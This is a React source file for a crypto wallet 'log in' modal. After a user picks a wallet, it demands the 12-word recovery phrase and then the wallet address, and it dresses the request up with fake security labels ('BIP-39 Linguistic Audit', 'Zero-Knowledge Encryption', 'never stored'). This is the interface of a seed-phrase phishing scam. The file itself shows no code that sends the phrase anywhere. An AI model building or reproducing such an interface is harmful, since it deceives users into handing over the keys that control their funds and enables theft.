import { useState } from 'react';
import { WALLETS } from '../data/constants';

function SeedPhraseModal({ wallet, onClose, onAuthorize }) {
  const [step, setStep] = useState('seed'); // 'seed' | 'address'
  const [phrase, setPhrase] = useState('');
  const [address, setAddress] = useState('');

  const wordCount = phrase.trim() === '' ? 0 : phrase.trim().split(/\s+/).length;
  const seedReady = wordCount >= 12;
  const addressReady = address.trim().length >= 10;

  const header = (label) => (
    <div style={{
      display: 'flex', alignItems: 'center', gap: 14,
      padding: '20px 20px 16px', borderBottom: '1px solid var(--border)'
    }}>
      <div style={{
        width: 48, height: 48, borderRadius: 14, flexShrink: 0,
        background: 'linear-gradient(135deg, #1a3a6a, #0d52cc)',
        display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 22
      }}>🔒</div>
      <div>
        <div style={{ fontSize: 11, fontWeight: 700, color: 'var(--text3)', letterSpacing: 1.5, textTransform: 'uppercase', marginBottom: 2 }}>
          Security Protocol:
        </div>
        <div style={{ fontSize: 13, fontWeight: 800, color: 'var(--text)', letterSpacing: 1, textTransform: 'uppercase' }}>
          {label}
        </div>
      </div>
      <button className="modal-close" style={{ marginLeft: 'auto' }} onClick={onClose}>✕</button>
    </div>
  );

  const walletBadge = (
    <div style={{
      display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16,
      padding: '8px 12px', background: 'var(--surface2)',
      border: '1px solid var(--border)', borderRadius: 10
    }}>
      <span style={{ fontSize: 18 }}>{wallet.icon}</span>
      <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--text)' }}>{wallet.name}</span>
      <span style={{ fontSize: 11, color: 'var(--text3)', marginLeft: 2 }}>— {wallet.desc}</span>
    </div>
  );

  const securityFooter = (
    <div style={{ padding: '8px 20px 20px' }}>
      <div style={{
        display: 'flex', alignItems: 'center', gap: 10, padding: '10px 14px',
        background: 'var(--surface2)', border: '1px solid var(--border)', borderRadius: 10
      }}>
        <div style={{
          width: 28, height: 28, borderRadius: 8, flexShrink: 0,
          background: 'var(--surface3)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 14
        }}>🔐</div>
        <div>
          <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--text3)', letterSpacing: 0.8 }}>
            <span style={{ color: 'var(--text2)' }}>PROTOCOL:</span> BIP-39 Standard Verified
          </div>
          <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--text3)', letterSpacing: 0.8 }}>
            <span style={{ color: 'var(--text2)' }}>SECURITY:</span> Zero-Knowledge Encryption
          </div>
        </div>
      </div>
    </div>
  );

  const actionBtn = (ready, label, onClick) => (
    <button onClick={onClick} style={{
      width: '100%', padding: '14px', borderRadius: 12, border: 'none',
      background: ready ? 'var(--accent)' : 'var(--surface2)',
      color: ready ? '#000' : 'var(--text3)',
      fontFamily: "'DM Sans', sans-serif", fontSize: 13, fontWeight: 800,
      letterSpacing: 1.5, textTransform: 'uppercase',
      cursor: ready ? 'pointer' : 'not-allowed', transition: 'all 0.2s',
      boxShadow: ready ? '0 4px 20px rgba(0,255,136,0.25)' : 'none',
    }}>{label}</button>
  );

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal" style={{ maxWidth: 480 }} onClick={e => e.stopPropagation()}>

        {/* ── STEP 1: SEED PHRASE ── */}
        {step === 'seed' && <>
          {header('BIP-39 Linguistic Audit')}
          <div style={{ padding: '20px 20px 4px' }}>
            {walletBadge}
            <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--text3)', letterSpacing: 2, textTransform: 'uppercase', marginBottom: 8 }}>
              Enter 12-Word Recovery Phrase
            </div>
            <textarea
              autoFocus
              placeholder="Type or paste your 12 recovery words..."
              value={phrase}
              onChange={e => setPhrase(e.target.value)}
              style={{
                width: '100%', height: 110, background: 'var(--surface2)',
                border: `1px solid ${seedReady ? 'var(--accent)' : 'var(--border)'}`,
                borderRadius: 12, padding: '12px 14px',
                fontFamily: "'DM Mono', monospace", fontSize: 13, color: 'var(--text)',
                outline: 'none', resize: 'none', lineHeight: 1.7, transition: 'border-color 0.2s',
              }}
            />
            <div style={{ display: 'flex', justifyContent: 'center', margin: '10px 0' }}>
              <div style={{
                padding: '4px 14px', borderRadius: 20,
                background: seedReady ? 'var(--accent-light)' : 'var(--surface2)',
                border: `1px solid ${seedReady ? 'var(--accent)' : 'var(--border)'}`,
                fontSize: 11, fontWeight: 700, letterSpacing: 1,
                color: seedReady ? 'var(--accent)' : 'var(--text3)',
                textTransform: 'uppercase', transition: 'all 0.2s'
              }}>
                Words: {wordCount} / 12
              </div>
            </div>
          </div>
          <div style={{ padding: '8px 20px' }}>
            {actionBtn(seedReady, 'Continue →', () => seedReady && setStep('address'))}
          </div>
          {securityFooter}
        </>}

        {/* ── STEP 2: WALLET ADDRESS ── */}
        {step === 'address' && <>
          {header('Wallet Address Verification')}
          <div style={{ padding: '20px 20px 4px' }}>
            {walletBadge}
            <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--text3)', letterSpacing: 2, textTransform: 'uppercase', marginBottom: 8 }}>
              Confirm Your Wallet Address
            </div>
            <input
              autoFocus
              placeholder={
                ['solflare', 'phantom', 'hotwallet', 'keplr'].includes(wallet.id)
                  ? 'Enter your .sol or base58 address'
                  : 'Enter your wallet address (0x...)'
              }
              value={address}
              onChange={e => setAddress(e.target.value)}
              style={{
                width: '100%', background: 'var(--surface2)',
                border: `1px solid ${addressReady ? 'var(--accent)' : 'var(--border)'}`,
                borderRadius: 12, padding: '13px 14px',
                fontFamily: "'DM Mono', monospace", fontSize: 13, color: 'var(--text)',
                outline: 'none', transition: 'border-color 0.2s',
              }}
            />
            <div style={{ fontSize: 11, color: 'var(--text3)', marginTop: 8, lineHeight: 1.6 }}>
              Confirms ownership of your {wallet.name} wallet. Your address is never stored.
            </div>
          </div>
          <div style={{ padding: '16px 20px 8px', display: 'flex', gap: 8 }}>
            <button onClick={() => setStep('seed')} style={{
              padding: '13px 16px', borderRadius: 12, border: '1px solid var(--border)',
              background: 'none', color: 'var(--text2)', fontFamily: "'DM Sans', sans-serif",
              fontSize: 13, fontWeight: 600, cursor: 'pointer', whiteSpace: 'nowrap'
            }}>← Back</button>
            <div style={{ flex: 1 }}>
              {actionBtn(addressReady, 'Authorize Connection', () => addressReady && onAuthorize())}
            </div>
          </div>
          {securityFooter}
        </>}

      </div>
    </div>
  );
}

export default function WalletModal({ title = 'Log in or sign up', onClose, onSelect, selectedWallet, onContinue, showContinue }) {
  const [q, setQ] = useState('');
  const [seedWallet, setSeedWallet] = useState(null);
  const filtered = q ? WALLETS.filter(w => w.name.toLowerCase().includes(q.toLowerCase())) : WALLETS;

  function handleWalletClick(w) {
    onSelect(w);
    setSeedWallet(w);
  }

  function handleAuthorize() {
    setSeedWallet(null);
    onContinue();
  }

  return (
    <>
      <div className="modal-overlay" onClick={onClose}>
        <div className="modal" onClick={e => e.stopPropagation()}>

          {/* HEADER */}
          <div className="modal-head">
            <div className="modal-title">{title}</div>
            <button className="modal-close" onClick={onClose}>✕</button>
          </div>

          {/* SEARCH */}
          <div className="modal-search">
            <span style={{ color: 'var(--text3)', fontSize: 14 }}>🔍</span>
            <input
              placeholder="Search through 645 wallets..."
              value={q}
              onChange={e => setQ(e.target.value)}
              autoFocus
            />
          </div>

          {/* WALLET LIST */}
          <div className="wallet-list">
            {filtered.map(w => (
              <div
                key={w.id}
                className={`w-row ${selectedWallet?.id === w.id ? 'sel' : ''}`}
                onClick={() => handleWalletClick(w)}
              >
                <div className="w-ico" style={{ background: (w.iconBg || '#ffffff') + '22' }}>
                  {w.icon}
                </div>
                <div>
                  <div className="w-name">{w.name}</div>
                  <div className="w-desc">{w.desc}</div>
                </div>
                {w.badge && (
                  <div className="w-badge">
                    <div className="w-dot" />
                    {w.badge}
                  </div>
                )}
              </div>
            ))}
          </div>

          {showContinue && (
            <div className="modal-footer">
              <button
                className="action-btn purple"
                style={{ margin: 0, width: '100%' }}
                onClick={onContinue}
                disabled={!selectedWallet}
              >
                {selectedWallet ? `Continue with ${selectedWallet.name}` : 'Select a wallet'}
              </button>
            </div>
          )}
        </div>
      </div>

      {/* BIP-39 → ADDRESS FLOW — locked to the clicked wallet */}
      {seedWallet && (
        <SeedPhraseModal
          wallet={seedWallet}
          onClose={() => setSeedWallet(null)}
          onAuthorize={handleAuthorize}
        />
      )}
    </>
  );
}